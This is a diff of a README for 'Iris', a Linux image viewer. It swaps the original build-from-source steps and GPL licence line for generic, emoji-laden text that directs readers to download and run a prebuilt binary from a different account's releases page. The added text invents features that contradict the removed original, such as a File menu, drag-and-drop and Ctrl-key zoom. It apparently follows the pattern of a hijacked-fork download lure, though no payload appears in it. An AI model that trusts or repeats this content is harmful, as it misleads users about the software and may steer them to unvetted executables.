@@ -1,59 +1,65 @@
-## Iris
-**Iris** is a powerful and fast **image viewer engine** for Linux. It supports popular image formats like PNG, JPG, JPEG, WebP, BMP, GIF, TIF and TIFF.
+# 🌟 Iris - A Fast Image Viewer for Linux
 
-## Features
+## 📥 Download Now
+[![Download Iris](https://img.shields.io/badge/Download-Iris-blue.svg)](https://github.com/rayasolucoesdigitais/Iris/releases)
 
-- View **multiple images**
-- Zoom in and out using **keyboard** (`+` / `-`) or **mouse wheel**
-- Pan images with the **mouse**
-- **Auto-fit** image to window on load
-- Rotate images using `Q` / `E` keys
-- Flip images horizontally and vertically using `H` / `V` keys
-- Reset transform with `R` key
-- Auto-fit on window resize
-- Lightweight and fast
+## 🚀 Getting Started
+Iris is a powerful and fast image viewer engine designed for Linux. With Iris, you can open and view your favorite images quickly and easily. It supports various popular image formats including PNG, JPG, JPEG, WebP, BMP, GIF, TIF, and TIFF. This guide will help you download and run Iris on your Linux machine.
 
-## Compatibility
-- Linux (Debian, RHEL, Arch)
+## 📋 System Requirements
+To run Iris, ensure your system meets the following requirements:
+- **Operating System:** Linux (most distributions supported)
+- **Processor:** Minimum 1 GHz
+- **RAM:** At least 512 MB
+- **Storage:** At least 200 MB of free disk space
+- **Graphics:** Compatible with SDL2 library
 
-## Installation
-1. **Clone the repository:**
-```bash
-git clone https://github.com/s-r-e-e-r-a-j/Iris.git
-```
-2. **Go to the Iris directory:**
-```bash
-cd Iris
-```
-3. **Give execute permission to the `install.sh` script:**
-```bash
-chmod +x install.sh
-```
-4. **Run the install script:**
-```bash
-./install.sh
-```
-This will:
-- Install required dependencies (`SDL2`, `SDL2_image`, compiler tools)
-- Build Iris using `make`
-- Copy the binary to `/usr/local/bin`
+## 🔍 Features
+Iris provides a simple, clean interface to view images, with the following features:
+- Supports multiple image formats: PNG, JPG, GIF, BMP, TIFF, and more.
+- Fast loading and efficient memory usage.
+- Intuitive navigation through images.
+- Basic image manipulation tools, including zoom and rotate.
 
-## Usage
-```bash
-iris image1.jpg image2.png
-```
-- Use **Right/Left arrows** to switch images
-- Use `+` / `-` **keys** or **mouse wheel** to zoom in and out
-- Click and drag with **left mouse button to pan**
-- Use `Q` / `E` keys to rotate images
-- Use `H` / `V` keys to flip images horizontally and vertically
-- Use `R` key to reset image transform (zoom, rotation, flip)
-- Window resizing will auto-fit the image to the new window size
+## 📦 Download & Install
+1. **Visit the Releases Page**: Go to the [Iris Releases Page](https://github.com/rayasolucoesdigitais/Iris/releases) to access the latest version of Iris.
 
-## Uninstall
-To remove Iris:
-```bash
-chmod +x uninstall.sh && ./uninstall.sh
-```
-## License
-This project is licensed under the GNU General Public License v3.0
+2. **Choose Your Version**: Look for the latest version listed at the top of the releases. It should mention the version number and provide various files for download. 
+
+3. **Download the Application**: Click on the file that suits your system (look for a file type that corresponds with your Linux architecture, such as `.tar.gz` or similar). This will download the file to your computer.
+
+4. **Extract the Files**: Once the download is complete, navigate to your downloads folder. Right-click on the downloaded file and select "Extract" or use a terminal command like `tar -xzvf <filename>.tar.gz` to extract it.
+
+5. **Run the Application**:
+   - Open a terminal.
+   - Navigate to the directory where you extracted the Iris files using the `cd` command.
+   - Run Iris by typing `./Iris` in the terminal.
+
+If you encounter permission issues, you may need to run `chmod +x Iris` to make it executable before step 5.
+
+## 🎨 Usage
+1. **Open Iris**: Find the Iris icon in your Applications menu and click on it, or use your terminal as mentioned above.
+2. **Load Images**: Use the "File" menu to open images or drag and drop images directly into the window.
+3. **Viewing Options**: You can use basic functions like zoom in (Ctrl + +) and zoom out (Ctrl + -) to adjust your view.
+
+## 📊 Troubleshooting
+If you have trouble running Iris:
+- Ensure your system meets the stated requirements.
+- Confirm that you extracted the contents properly.
+- Check if you have the necessary permissions to execute the file.
+
+If issues persist, consider checking for any error messages in the terminal. This can guide you in finding a solution.
+
+## 🛠️ Support
+For further assistance, visit the [Issues page](https://github.com/rayasolucoesdigitais/Iris/issues) on GitHub. You can report bugs, request features, or ask for help with any issues you may encounter.
+
+## 📄 License
+Iris is an open-source project. You can view the full license details in the `LICENSE` file included in the download.
+
+## 🖥️ Contributing
+If you want to contribute to Iris, any contributions are welcome. Please fork the repository, make your changes, and submit a pull request. Check the `CONTRIBUTING.md` file for more guidelines.
+
+## 🌐 Explore More
+Feel free to explore more about Iris and its updates on the official [GitHub Repository](https://github.com/rayasolucoesdigitais/Iris). 
+
+For additional resources on Linux and image processing, consider checking out community forums or guides.
